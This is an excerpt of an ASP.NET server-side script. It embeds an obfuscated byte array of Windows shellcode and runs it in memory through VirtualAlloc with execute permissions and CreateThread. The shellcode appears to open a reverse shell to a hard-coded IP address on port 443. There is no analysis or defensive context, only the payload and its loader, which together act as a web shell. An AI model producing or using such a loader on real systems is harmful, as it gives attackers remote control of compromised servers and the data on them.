...
<script runat="server">
    ...
    {
        byte[] lS50mr9Mbk = new byte[375] {0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,
0x89,0xe5,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x31,0xff,0x0f,0xb7,0x4a,0x26,0x31,0xc0,0xac,
...
0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x0e,0x12,
0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,
0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,
0xff,0xd5};

        IntPtr lcPqU = VirtualAlloc(IntPtr.Zero,(UIntPtr)lS50mr9Mbk.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(lS50mr9Mbk,0,lcPqU,lS50mr9Mbk.Length);
        IntPtr ltB4J6p2WKz = IntPtr.Zero;
        IntPtr n5Wbw99hKyCm = CreateThread(IntPtr.Zero,UIntPtr.Zero,lcPqU,IntPtr.Zero,0,ref ltB4J6p2WKz);
    }
</script>
